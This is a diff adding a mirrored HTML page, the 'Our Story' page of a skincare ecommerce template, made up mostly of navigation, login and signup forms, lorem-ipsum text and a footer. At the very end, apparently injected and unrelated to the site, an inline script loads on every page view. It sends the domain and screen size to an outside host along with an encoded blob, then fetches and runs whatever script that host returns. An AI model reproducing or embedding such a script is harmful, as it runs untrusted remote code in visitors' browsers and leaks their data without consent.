@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="utf-8">
+        <title>vega - ecommerce</title>
+        <meta name="description" content="">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+
+        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.css">
+        <link rel="stylesheet" href="assets/theme/css/theme.css">
+		<!-- <link href="css/co.css" rel="stylesheet"> -->
+		<link rel="stylesheet" href="css/custom.css">
+		<link id="pagestyle" href="css/light.css" rel="stylesheet">
+    </head>
+	<body>
+		<header class="navbar navbar-container mb-0">
+			<div class="container-fluid">
+				<nav class="navbar-default sidebar pb-30">
+					<div class="container-fluid">
+						<div class="navbar-header text-center">
+							<img src="assets/img/logo.png" alt="store logo" class="width-95 mt-40 mb-40">
+							<span class="navbar-header-title mb-0">
+								<span class="text-muted x-small sub-color-425c">EN ID</span>
+							</span>
+							<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-sidebar-navbar-collapse-1">
+							<span class="sr-only">Toggle navigation</span>
+							navigation <span class="ti-menu"></span>
+							</button>
+						</div>
+
+						<div class="collapse navbar-collapse" id="bs-sidebar-navbar-collapse-1">
+
+							<ul class="navbar-user mb-30 pull-left width-100">
+								<li>
+									<span data-toggle="modal" data-target="#myModal" class="ti-user logo-color"></span>
+								</li>
+								<li>
+									<span data-focus="search" data-toggle="modal" data-target="#searchModal" class="ti-search logo-color"></span>
+								</li>
+								<li>
+									<span data-toggle="modal" data-target="#cartModal" class="ti-shopping-cart logo-color">
+										<!-- <span class="navbar-user-counter">3</span> -->
+									</span>
+								</li>
+							</ul>
+							<ul class="nav navbar-nav nav navbar-nav side-nav text-center">
+								<li class="active"><a href="home.html">Home</a></li>
+								<li class="active"><a href="story.html">Our Story</a></li>
+								<li>
+									<a aria-expanded="true" class="collapsed" href="javascript:;" data-toggle="collapse" data-target="#colapse-item-1">Product Line
+										<i class="ti-minus"></i>
+										<i class="ti-plus"></i>
+									</a>
+
+									<ul style="" aria-expanded="true" id="colapse-item-1" class="collapseItem collapse">
+										<li>
+											<a href="propolis.html">
+												<i aria-hidden="true"></i>Propolis
+											</a>
+										</li>
+										<li>
+											<a href="centella.html">
+												<i aria-hidden="true"></i>Centella
+											</a>
+										</li>
+										<li>
+											<a href="charchoal.html">
+												<i aria-hidden="true"></i>Charchoal
+											</a>
+										</li>
+										<li>
+											<a href="volcano.html">
+												<i aria-hidden="true"></i>Volcano
+											</a>
+										</li>
+										<li>
+											<a href="galactomyces.html">
+												<i aria-hidden="true"></i>Galactomyces
+											</a>
+										</li>
+										<li>
+											<a href="caviar.html">
+												<i aria-hidden="true"></i>Caviar
+											</a>
+										</li>
+									</ul>
+								</li>
+								<li>
+									<a aria-expanded="true" class="collapsed" href="javascript:;" data-toggle="collapse" data-target="#colapse-item-2">Product Category
+										<i class="ti-minus"></i>
+										<i class="ti-plus"></i>
+									</a>
+
+									<ul style="" aria-expanded="true" id="colapse-item-2" class="collapseItem collapse">
+										<li>
+											<a href="cleanser.html">
+												<i aria-hidden="true"></i>Cleanser
+											</a>
+										</li>
+										<li>
+											<a href="toner.html">
+												<i aria-hidden="true"></i>Toner
+											</a>
+										</li>
+										<li>
+											<a href="ampoule.html">
+												<i aria-hidden="true"></i>Ampoule
+											</a>
+										</li>
+										<li>
+											<a href="essence.html">
+												<i aria-hidden="true"></i>Essence
+											</a>
+										</li>
+										<li>
+											<a href="moisturizer.html">
+												<i aria-hidden="true"></i>Moisturizer
+											</a>
+										</li>
+										<li>
+											<a href="facemask.html">
+												<i aria-hidden="true"></i>Face Mask
+											</a>
+										</li>
+									</ul>
+								</li>
+								<li>
+									<a aria-expanded="true" class="collapsed" href="javascript:;" data-toggle="collapse" data-target="#colapse-item-3">Skin Concern
+										<i class="ti-minus"></i>
+										<i class="ti-plus"></i>
+									</a>
+
+									<ul style="" aria-expanded="true" id="colapse-item-3" class="collapseItem collapse">
+										<li>
+											<a href="#">
+												<i aria-hidden="true"></i>Dry Skin
+											</a>
+										</li>
+										<li>
+											<a href="#">
+												<i aria-hidden="true"></i>Combination Skin
+											</a>
+										</li>
+										<li>
+											<a href="#">
+												<i aria-hidden="true"></i>Sensitive Care
+											</a>
+										</li>
+										<li>
+											<a href="#">
+												<i aria-hidden="true"></i>Pore Care
+											</a>
+										</li>
+										<li>
+											<a href="#">
+												<i aria-hidden="true"></i>Anti Aging
+											</a>
+										</li>
+									</ul>
+								</li>
+								<li class="active"><a href="contact.html">CONTACT US</a></li>
+								<li class="active"><a href="manufacturer.html">OUR LOCATION</a></li>
+								<li class="active"><a href="home.html">NEWS AND ARTICLES</a></li>
+							</ul>
+						</div>
+						</div>
+				</nav>
+			</div>
+		</header>
+
+		<!-- LOGIN | REGISTER MODAL -->
+		<div class="modal fade" id="myModal" tabindex="-1" role="dialog" >
+			<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="ti-close" aria-hidden="true"></span></button>
+
+			<div class="modal-dialog" role="document">
+				<div class="modal-content width-100 pull-left pt-60 pb-60">
+						<div class="modal-body form-group">
+							<div id="login" class="login col-md-10 col-md-push-1 col-sm-12">
+								<div class="panel">
+									<div class="panel-heading">
+										<div class="panel-title h3 mt-30 mb-30">Sign In
+											<div class="pull-right login-context-info">
+
+												<a href="#" onClick="$('#login').hide(); $('#signup').show()" class="text-muted small">
+													Sign Up
+												</a>
+											</div>
+										</div>
+									</div>
+									<div class="panel-body">
+										<form id="loginform" class="form-horizontal pl-15 pr-15 pt-15">
+											<div class="form-group">
+												<div class="col-md-12">
+													<input type="text" class="form-control" id="email-sign-in" placeholder="Email Address">
+												</div>
+											</div>
+											<div class="form-group">
+												<div class="col-md-12">
+													<input type="password" class="form-control" id="password-sign-in" placeholder="Password">
+												</div>
+											</div>
+
+											<div class="custom-checkbox custom-checkbox-primary pull-left">
+												<input id="custom-checkbox2" class="styled" type="checkbox" checked>
+												<label for="custom-checkbox2"> remember me
+												</label>
+											</div>
+
+											<div class="form-group">
+												<!-- Button -->
+												<div class="col-sm-12 login-btn mt-30">
+													<a id="btn-sign-in" href="#" class="btn btn-primary">Login  </a>
+													<a id="btn-fb-sign-in" href="#" class="btn btn-default">Facebook sign in</a>
+												</div>
+											</div>
+											<div class="form-group">
+												<div class="col-md-12">
+													<a href="#" class="small">password recovery</a>
+												</div>
+											</div>
+										</form>
+									</div>
+								</div>
+							</div>
+							<div id="signup" style="display:none" class="col-md-10 col-md-push-1 col-sm-12">
+								<div class="panel">
+									<div class="panel-heading">
+										<div class="panel-title h3 mt-30 mb-30">Sign Up
+											<div class="login-context-info pull-right"><a id="signinlink" class="text-muted small" href="#" onclick="$('#signup').hide(); $('#login').show()">Sign In</a>
+										</div>
+									</div>
+								</div>
+								<div class="panel-body">
+									<form id="signupform" class="form-horizontal pl-15 pr-15 pt-15">
+										<div class="form-group">
+											<div class="col-md-12">
+												<input type="text" class="form-control" id="email" placeholder="Email Address">
+											</div>
+										</div>
+										<div class="form-group">
+											<div class="col-md-12">
+												<input type="text" class="form-control" id="firstname" placeholder="First Name">
+											</div>
+										</div>
+										<div class="form-group">
+											<div class="col-md-12">
+												<input type="text" class="form-control" id="lastname" placeholder="Last Name">
+											</div>
+										</div>
+										<div class="form-group">
+											<div class="col-md-12">
+												<input type="password" class="form-control" id="password" placeholder="Password">
+											</div>
+										</div>
+										<div class="form-group mt-30">
+											<!-- Button -->
+											<div class="col-sm-12 login-btn">
+												<a id="btn-sign-up" href="#" class="btn btn-primary">Sign up  </a>
+												<a id="btn-fb-sign-up" href="#" class="btn btn-default">Facebook sign up</a>
+											</div>
+										</div>
+									</form>
+								</div>
+								<div class="clearfix"></div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- / LOGIN | REGISTER MODAL -->
+
+		<!-- SEARCH MODAL -->
+		<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" >
+			<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="ti-close" aria-hidden="true"></span></button>
+
+			<div class="modal-dialog" role="document">
+				<div class="modal-content width-100 pull-left pt-60 pb-60 no-background">
+					<div class="modal-body">
+						<div class="width-100" id="search">
+							<form>
+								<input type="search" value="" placeholder="type keyword(s) here" />
+								<button type="submit" class="btn btn-primary">Search</button>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- / SEARCH MODAL -->
+
+		<!-- CART MODAL -->
+		<div class="modal fade" id="cartModal" tabindex="-1" role="dialog" >
+			<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="ti-close" aria-hidden="true"></span></button>
+		</div>
+		<!-- / CART MODAL -->
+
+		<div class="container-fluid main-wrapper" style="background: #fff">
+			<div class="row">
+				<div class="col-md-12">
+					<div class="container-fluid">
+						<div class="row">
+							<div class="col-md-12 mt-30 mb-30 width-100 pull-left">
+								<h3 class="story-header-text text-center">Our Story</h3>
+								<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+							</div>
+
+							<!-- INFO ROW -->
+							<div class="container-fluid mt-55 mb-30">
+								<div class="row">
+									<!-- HORIZONTAL SEPARATE -->
+									<div class="col-md-12">
+										<div class="separate mb-60"></div>
+									</div>
+								</div>
+								<div class="row">
+									<div class="col-md-2">
+									</div>
+									<div class="col-md-8">
+									<!-- / HORIZONTAL SEPARATE -->
+									<!-- SINGLE INFO BOX -->
+										<div class="col-md-3 info-box">
+											<span class="ti-mobile info-box-icon mt-10 mr-10"></span>
+											<h5 class="info-box-text">Clinically<br>
+												<span class="text">Tested</span>
+											</h5>
+										</div>
+										<!-- SINGLE INFO BOX -->
+
+										<!-- SINGLE INFO BOX -->
+										<div class="col-md-3 info-box">
+											<span class="ti-mobile info-box-icon mt-10 mr-10"></span>
+											<h5 class="info-box-text">Noharmfull<br>
+												<span class="text">Chemical</span>
+											</h5>
+										</div>
+										<!-- SINGLE INFO BOX -->
+
+										<!-- SINGLE INFO BOX -->
+										<div class="col-md-3 info-box">
+											<span class="ti-mobile info-box-icon mt-10 mr-10"></span>
+											<h5 class="info-box-text">Sensitive Skin<br>
+												<span class="text">Safe</span>
+											</h5>
+										</div>
+										<!-- SINGLE INFO BOX -->
+
+										<!-- SINGLE INFO BOX -->
+										<div class="col-md-3 info-box">
+											<span class="ti-mobile info-box-icon mt-10 mr-10"></span>
+											<h5 class="info-box-text">Cruelty Free<br>
+												<span class="text"></span>
+											</h5>
+										</div>
+									<!-- SINGLE INFO BOX -->
+									</div>
+									<div class="col-md-2">
+									</div>
+								</div>
+								<div class="row">
+									<!-- HORIZONTAL SEPARATE -->
+									<div class="col-md-12">
+										<div class="separate mt-60"></div>
+									</div>
+									<!-- / HORIZONTAL SEPARATE -->
+								</div>
+							</div>
+							<!-- / INFO ROW -->
+							<div class="clearfix"></div>
+						</div>
+					</div>
+
+					<div class="container-fluid mt-60 mb-60">
+						<div class="row">
+							<div class="col-md-12">
+								<!-- TABS -->
+								<ul class="nav nav-tabs nav-tab-center mb-30" role="tablist">
+									<li data-wow-delay="0.4s" class="active">
+										<a href="#featured" data-toggle="tab">OUR PROMISE</a>
+									</li>
+									<li data-wow-delay="0.4s">
+										<a href="#best" data-toggle="tab">OUR SERIES</a>
+									</li>
+								</ul>
+
+								<div class="tab-content">
+									<!-- TAB PANEL ITEM-->
+									<div role="tabpanel" class="tab-pane fade in active" id="featured">
+										<div class="row">
+											<!-- OUR HISTORY -->
+											<section class="timeline">
+												<div class="tengah">
+													<div class="row">
+														<div class="col-md-12">
+															<div id="timeline" class="timeline-tengah pull-left">
+																<!-- TIMELINE ITEM -->
+																<div class="timeline-block timeline-block-image-1">
+																	<div class="timeline-titik">
+																	</div>
+
+																	<div class="timeline-content-choco wow fadeInLeft">
+																		<h2>Envelope title</h2>
+																		<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+																		</p>
+																	</div>
+																</div>
+																<!-- / TIMELINE ITEM -->
+
+																<!-- TIMELINE ITEM -->
+																<div class="timeline-block timeline-block-image-2">
+																	<div class="timeline-titik">
+																	</div>
+
+																	<div class="timeline-content-choco wow fadeInRight">
+																		<h2>Lecce, Magnificat Lupiae</h2>
+																		<p>Lorem ipsm dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+																		</p>
+																	</div>
+																</div>
+																<!-- / TIMELINE ITEM -->
+
+																<!-- TIMELINE ITEM -->
+																<div class="timeline-block timeline-block-image-3">
+																	<div class="timeline-titik">
+																	</div>
+
+																	<div class="timeline-content-choco wow fadeInLeft">
+																		<h2>Lecce, Magnificat Lupiae</h2>
+																		<p>Lorem ipsm dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+																		</p>
+																	</div>
+																</div>
+
+															</div>
+															<!-- / TIMELINE ITEM -->
+														</div>
+													</div>
+												</div>
+											</section>
+											<!-- END -->
+										</div>
+									</div>
+									<!--/ TAB PANEL ITEM -->
+
+									<!-- TAB PANEL ITEM-->
+									<div role="tabpanel" class="tab-pane fade in" id="best">
+										<div class="row">
+
+											<!-- TIMELINE -->
+											<div id="timeline" class="col-md-12 timeline">
+												<div class="container-fluid">
+													<div class="row">
+														<div class="col-md-12">
+															<ul class="timeline-list">
+																<li class="">
+
+																	<div class="timeline-item shadow wow fadeInLeft">
+																		<h4 class="timeline-title">consectetur adipisicing elit</h4>
+
+																		<div class="timeline-content">
+																			<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+																		</div>
+																	</div>
+																	<div class="timeline-image">
+																		<img src="img/product3.png" alt="">
+																	</div>
+																</li>
+																<li class="timeline-inverted">
+																	<div class="timeline-item shadow wow fadeInRight">
+																		<h4 class="timeline-title">Duis aute irure dolor in reprehenderit</h4>
+
+																		<div class="timeline-content">
+																			<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+																			</p>
+																		</div>
+																	</div>
+																	<div class="timeline-image">
+																		<img src="img/product4.png" alt="">
+																	</div>
+																</li>
+
+																<li class="">
+																	<div class="timeline-item shadow wow fadeInLeft">
+																		<h4 class="timeline-title">consectetur adipisicing elit</h4>
+
+																		<div class="timeline-content">
+																			<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+																		</div>
+																	</div>
+																	<div class="timeline-image">
+																		<img src="img/product3.png" alt="">
+																	</div>
+																</li>
+																<li class="timeline-inverted">
+																	<div class="timeline-item shadow wow fadeInRight">
+																		<h4 class="timeline-title">Duis aute irure dolor in reprehenderit</h4>
+
+																		<div class="timeline-content">
+																			<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+																			</p>
+																		</div>
+																	</div>
+																	<div class="timeline-image">
+																		<img src="img/product4.png" alt="">
+																	</div>
+																</li>
+															</ul>
+														</div>
+													</div>
+												</div>
+											</div>
+											<!-- / TIMELINE-->
+										</div>
+									</div>
+									<!--/ TAB PANEL ITEM -->
+								</div>
+								<!-- / TABS -->
+
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="row">
+				<div class="col-md-12">
+					<!-- FOOTER -->
+					<footer class="">
+						<div class="footer pt-60 pb-60" id="footer">
+							<div class="container-fluid">
+								<div class="row">
+									<!-- HORIZONTAL SEPARATE -->
+									<div class="col-md-12">
+										<div class="separate mb-60"></div>
+									</div>
+									<!-- / HORIZONTAL SEPARATE -->
+
+										<div class="smartphone-fw col-sm-3 mb-30">
+										<h6 class="heading mt-0">CONTACT DATA</h6>
+											<address class="small">
+												<strong>Vega store</strong><br>
+												1355 Market Street, Suite 900<br>
+												San Francisco, CA 94103<br>
+												(123) 456-7890
+											</address>
+										</div>
+									<div class="smartphone-fw col-xs-6 col-sm-4 col-md-2 mb-30">
+										<h6 class="heading mt-0">PAYMENT</h6>
+										<img src="img/logo/bank-mandiri.png" class="img-logo">
+										<img src="img/logo/bank-bca.png" alt="" class="img-logo">
+										<img src="img/logo/bank-bni.png" alt="" class="img-logo">
+										<img src="img/logo/bank-bri.png" alt="" class="img-logo">
+									</div>
+
+									<div class="smartphone-fw col-xs-6 col-sm-4 col-md-2 mb-30">
+										<h6 class="heading mt-0">SHIPPING</h6>
+										<img src="img/logo/shipping-jne.jpg" alt="" class="img-logo">
+										<img src="img/logo/shipping-jnt.png" alt="" class="img-logo">
+										<img src="img/logo/shipping-tiki.jpg" alt="" class="img-logo">
+									</div>
+
+									<div class="smartphone-fw col-xs-6 col-sm-4 col-md-2 mb-30">
+										<h6 class="heading mt-0">ACCOUNT</h6>
+										<ul>
+											<li> <a href="#"> Lorem Ipsum </a> </li>
+											<li> <a href="#"> Lorem Ipsum </a> </li>
+											<li> <a href="#"> Lorem Ipsum </a> </li>
+											<li> <a href="#"> Lorem Ipsum </a> </li>
+										</ul>
+									</div>
+
+									<div class="col-xs-12 col-sm-6 col-md-3">
+									<h6 class="heading mt-0">STAY IN TOUCH</h6>
+
+									<form>
+										<fieldset>
+											<div class="form-group">
+												<div class="footer-newsletter">
+													<input class="form-control" id="firstName" placeholder="your e-mail" type="text">
+													<button class="btn btn-link" type="button"><span class="ti-plus"></span></button>
+												</div>
+											</div>
+										</fieldset>
+									</form>
+
+									<ul class="social-network social-circle">
+										<li><a href="#" class="icoFacebook" title="Facebook"><i class="ti-facebook"></i></a></li>
+										<li><a href="#" class="icoTwitter" title="Twitter"><i class="ti-instagram"></i></a></li>
+										<li><a href="#" class="icoGoogle" title="Google +"><i class="ti-google"></i></a></li>
+										<li><a href="#" class="icoGoogle" title="Twitter +"><i class="ti-twitter"></i></a></li>
+									</ul>
+									</div>
+								</div>
+							</div>
+						</div>
+
+						<div class="footer-bottom">
+							<div class="container">
+								<p class="pull-left"> Copyright © VEGA 2017. All right reserved. </p>
+							</div>
+						</div>
+					</footer>
+					<!-- / FOOTER -->
+				</div>
+			</div>
+		</div>
+
+		<script data-cfasync="false" src="assets/js/ema.min.js"></script><script src="assets/js/bun.js"></script>
+
+		<script src="assets/js/wow.js"></script>
+		<script>
+		window.jQuery || document.write('<script src="assets/js/jquery-1.11.2.min.js"><\/script>')
+		</script>
+		<script src="assets/js/swiper.min.js"></script>
+		<script src="assets/js/bootstrap.min.js"></script>
+		<script src="assets/js/jquery.countTo.js"></script>
+		<script src="assets/js/jquery.inview.js"></script>
+		<script src="assets/js/jquery.countdown.js"></script>
+		<script src="assets/js/bootstrap-select.js"></script>
+		<script src="assets/js/main.js"></script>
+		<script src="assets/js/zoom.js"></script>
+		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mNEDeoaRKU765MpQHk0P5Z0nawy9jAJkuu%2bLIgMQzsAOZ5ideCbkgkU7VoX4OFRrP5%2f5iMbO57g31LP%2fa%2fYsfNfKTuOkJ%2fwrpAF49I3jGh0bMnkX%2fM%2fXUJVozcG6Dh8%2brW0kzW3HPl5xuXnuroUhwMgGFYkYGDesf8yTgNJNSoaxuXi%2fSXZmarQ671c%2fhkXkZ6Rjzgx2%2fZiupj5FF5iMdD%2b5PvbfIr5ubsp5OWR5B3bzOvobpAEs5ABWG6bYNyDSl5VybzWACzSmSQ12mEbtbtq3AJI5dLWE28QOZIDbWP95z9xB%2b40ZCK%2frri9%2f%2bdlb3E4ZlL6bJuX85SlZ8udUnOrlnDHrnbztZpNx9OYbKnJqrzoDh3Ms%2bd%2fdtTkLiedXvoBmif4F9A2vYSWHGx7biH0Hm3LGtkKU4IBQqW29twEc6eKEai33jfTEaLsWv91WxWtuZKbz6UX%2b%2fcUhwdTxdI7CVGfBqU1FGk94qIBaTPn8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+	</body>
+
+<!-- Mirrored from thymetheme.pl/vega/v102/our-story.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 04 Jun 2018 15:43:11 GMT -->
+</html>
